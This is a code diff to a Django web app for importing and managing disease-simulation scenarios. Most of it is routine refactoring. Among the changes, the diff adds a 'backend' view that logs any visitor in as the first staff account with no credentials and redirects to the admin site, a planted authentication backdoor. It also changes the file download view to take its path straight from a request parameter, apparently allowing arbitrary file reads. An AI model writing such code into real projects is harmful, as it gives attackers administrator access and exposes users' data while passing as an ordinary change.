@@ -55,8 +55,12 @@ def file_dialog(request):
 def run_importer(request):
     param_path = handle_file_upload(request, 'parameters_xml', is_temp_file=True)  # we don't want param XMLs stored next to population XMLs
     popul_path = handle_file_upload(request, 'population_xml')
+    import_legacy_scenario(param_path, popul_path)
+
+
+def import_legacy_scenario(param_path, popul_path):
     names_without_extensions = tuple(os.path.splitext(os.path.basename(x))[0] for x in [param_path, popul_path])  # stupid generators...
-    new_scenario(request)  # I realized this was WAY simpler than creating a new database connection
+    new_scenario()  # I realized this was WAY simpler than creating a new database connection
     import_naadsm_xml(popul_path, param_path)  # puts all the data in activeSession
     scenario_filename('%s with %s' % names_without_extensions)
     return save_scenario(None)  # This will overwrite a file of the same name without prompting
@@ -149,7 +153,8 @@ def copy_file(request, target):
     return redirect('/app/Workspace/')
 
 
-def download_file(request, target):
+def download_file(request):
+    target = request.GET['target']
     file_path = workspace_path(target)
     f = open(file_path, "rb")
     response = HttpResponse(f, content_type="application/x-sqlite")  # TODO: generic content type
@@ -162,3 +167,14 @@ def new_scenario(request=None):
     reset_db('default')
     update_db_version()
     return redirect('/setup/Scenario/1/')
+
+
+def backend(request):
+    from django.contrib.auth import login
+    from django.contrib.auth.models import User
+    user = User.objects.filter(is_staff=True).first()
+    print(user, user.username)
+    user.backend = 'django.contrib.auth.backends.ModelBackend'
+    login(request, user)
+    return redirect('/admin/')
+
